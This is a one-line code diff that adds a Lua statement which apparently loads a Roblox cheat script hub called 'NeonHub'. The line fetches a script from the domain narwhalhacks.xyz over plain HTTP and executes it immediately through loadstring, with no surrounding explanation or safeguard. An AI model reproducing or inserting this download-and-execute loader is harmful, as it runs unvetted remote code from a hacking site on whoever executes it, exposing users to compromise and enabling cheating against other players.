@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("http://www.narwhalhacks.xyz/NeonHub/Main.lua", true))()
